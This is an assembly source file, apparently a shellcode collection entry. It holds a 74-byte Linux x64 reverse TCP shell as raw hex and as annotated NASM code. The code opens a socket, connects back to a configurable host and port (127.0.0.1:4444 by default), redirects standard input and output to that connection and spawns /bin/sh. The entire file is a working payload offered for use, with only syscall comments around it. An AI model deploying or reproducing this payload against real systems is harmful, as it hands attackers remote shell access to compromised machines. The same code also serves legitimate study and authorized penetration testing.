; Title:    Linux x64 reverse TCP shell (LHOST:LPORT)
; Platform: linux
; Arch:     x64
; Size:     74 bytes
; Encoding: raw
;
; Assembled hex:
; \x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05

BITS 64
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    push    0x29
    pop     rax
    cdq
    push    0x2
    pop     rdi
    push    0x1
    pop     rsi
    syscall                     ; rax = sockfd
    xchg    rdi, rax
    ; connect to LHOST:LPORT (default 127.0.0.1:4444)
    mov     rcx, 0x0100007f5c110002  ; 127.0.0.1:4444 big-endian
    push    rcx
    mov     rsi, rsp            ; &sockaddr_in
    push    0x10
    pop     rdx
    push    0x2a
    pop     rax
    syscall
    ; dup2(sockfd, 0/1/2)
    push    0x3
    pop     rsi
dup_loop:
    dec     rsi
    push    0x21
    pop     rax
    syscall
    jne     dup_loop
    ; execve /bin/sh
    push    0x3b
    pop     rax
    cdq
    mov     rbx, 0x68732f6e69622f
    push    rbx
    mov     rdi, rsp
    push    rdx
    push    rdi
    mov     rsi, rsp
    syscall
